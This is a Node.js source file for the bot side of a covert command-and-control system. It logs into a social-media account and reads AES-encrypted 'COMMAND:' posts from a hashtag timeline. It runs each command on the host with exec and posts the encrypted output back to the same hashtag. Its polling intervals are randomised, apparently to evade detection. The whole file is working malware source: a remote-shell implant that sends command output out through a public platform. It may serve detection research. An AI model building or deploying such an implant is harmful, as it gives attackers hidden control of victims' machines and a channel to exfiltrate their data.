require('dotenv').config();
const path = require('path');
const { exec } = require('child_process');
const fs = require('fs');

const { login, acceptCookies } = require('./lib/login.js');
const Commands = require('./lib/commands.js');
const Encryption = require('./lib/encryption.js');
const { log, sleep, Difficulty, fetchImage } = require('../utils/utils.js');
const { URLS, COMMANDS, COMMUNICATION } = require('../config/constants.js');
const MESSAGES = require('../config/messages.js');

USER = process.env.BOT_EMAIL;
PASS = process.env.BOT_PASSWORD;
VERIFICATION = process.env.BOT_VERIFICATION;
BROWSER = process.env.BROWSER;
HEADLESS = process.env.HEADLESS == "true" ? "new" : false;
TOPIC = process.env.TOPIC;
SECRET = process.env.CONTENT_ENCRYPTION_SECRET;
IMAGES_API = process.env.PLACEHOLDER_IMAGES_API;

const encryption = new Encryption('aes-256-cbc', SECRET);

const nextAction = () => {
	log(MESSAGES.EMPTY);
	sleep(COMMANDS.DELAY);
}

async function queryCommand(commands) {
	return await new Promise(async (resolve) => {
		log(MESSAGES.COMMAND_WAITING);
		
		// return to communication channel
		commands.page.goto(`${URLS.TOPIC.format(TOPIC)}?f=live`, { waitUntil: 'networkidle2' });
	
		const latest = await commands.getTimelinePost(1);
		if (!latest)
			return resolve(null);
	
		let content = await commands.getPostContent(latest);
	
		content = content.replace(`#${TOPIC}`, "").trim();
	
		if (content.startsWith("COMMAND:")) {
			let command = content.replace("COMMAND:", "").trim().split("[")[0].trim();
			command = encryption.decrypt(command);
			log(MESSAGES.COMMAND_RECEIVED.format(command));
	
			return resolve(command);
		}
		
		return resolve(null);
	});
}

async function executeCommand(command) {
	return new Promise((resolve) => {
		exec(command, (err, stdout, stderr) => {
			resolve({ stdout, stderr });
		});
	});
}

async function sendResult(commands, result) {
	log(result);

	const timestampSample = (Date.now()).toString().slice(8, 12); // make the tweet unique to avoid duplicate error
	result = encryption.encrypt(result);
	result = "OUTPUT: " + result + " " + `[${timestampSample}]`;
	await commands.makePost(result, [`#${TOPIC}`]);
	// await commands.makePost(result, [`#${TOPIC}`], await fetchImage(IMAGES_API, "../temp/image-bot.png"));
}

const waitTime = (difficulty) => {
	switch (difficulty) {
		case Difficulty.Dumb:
			// fixed time interval
			return COMMUNICATION.CHECK_INTERVAL;
		case Difficulty.Regular:
			// random time interval having into consideration the fixed time interval
			lowerBound = parseInt(COMMUNICATION.CHECK_INTERVAL - COMMUNICATION.CHECK_INTERVAL * 0.2);
			upperBound = parseInt(COMMUNICATION.CHECK_INTERVAL + COMMUNICATION.CHECK_INTERVAL * 0.8);
			return Math.floor(Math.random() * (upperBound - lowerBound + 1)) + lowerBound;
		case Difficulty.Advanced:
			// TODO: implement
			// simulate human behavior
			// two instances:
			// 1. time to wait until new check
			// 2. time within an activity burst (p.e.: sending 3 commands in a row, separated by this time (or if only 1 command, then do other things))
			return 0;
		default:
			return COMMUNICATION.CHECK_INTERVAL;
	}
}

process.on('SIGINT', function() {
	// delete image-bot.png from temp folder if exists
	if (fs.existsSync(path.join(__dirname, "../temp/image-bot.png")))
		fs.unlinkSync(path.join(__dirname, "../temp/image-bot.png"));
	
	log(MESSAGES.EXITING);
	process.exit();
});

let difficulty = Difficulty.Dumb;

// run bot
(async () => {
	log(MESSAGES.STARTING.format(path.basename(__filename).replace(".js", "")));

	// parse arguments
	const args = process.argv.slice(2);
	if (args.length > 0) {
		difficulty = parseInt(args[0]);
	}

	const page = await login(USER, PASS, VERIFICATION, URLS.LOGIN, BROWSER, HEADLESS);
	nextAction();
	await acceptCookies(page);
	nextAction();

	const commands = new Commands(page);

	// open communication channel and pass timestamp
	await commands.makePost(`${COMMUNICATION.OPEN} [${Date.now()}]`, [`#${TOPIC}`]);
	// await commands.makePost(`${COMMUNICATION.OPEN} [${Date.now()}]`, [`#${TOPIC}`], await fetchImage(IMAGES_API, "../temp/image-bot.png"));
	nextAction();

	// wait for command from commander
	while (true) {
		const command = await queryCommand(commands);
		if (command) {
			// Execute the command and wait for it to complete
			let { stdout, stderr } = await executeCommand(command);
			if (stderr) {
				log(stderr);
				continue;
			}
	
			// Send the result back to the commander
			await sendResult(commands, stdout);
			continue;
		}

		// wait for next action
		const time = waitTime(difficulty);
		log(`Delay: ${time}ms`);
		await sleep(time);
	}
})();